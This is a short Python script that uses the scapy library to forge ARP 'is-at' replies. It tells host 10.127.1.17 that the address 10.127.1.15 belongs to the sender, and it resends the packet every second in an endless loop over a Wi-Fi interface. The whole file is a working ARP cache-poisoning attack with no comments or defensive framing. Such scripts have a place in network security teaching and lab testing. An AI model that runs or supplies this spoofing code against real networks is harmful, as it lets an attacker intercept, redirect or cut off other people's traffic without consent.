import sys
import time
from scapy.all import sendp, ARP, Ether



iface = "Wi-Fi"
target_ip = "10.127.1.17"
fake_ip = "10.127.1.15"

ethernet = Ether()
arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
packet = ethernet / arp
while True:
    sendp(packet , iface=iface)
    time.sleep(1)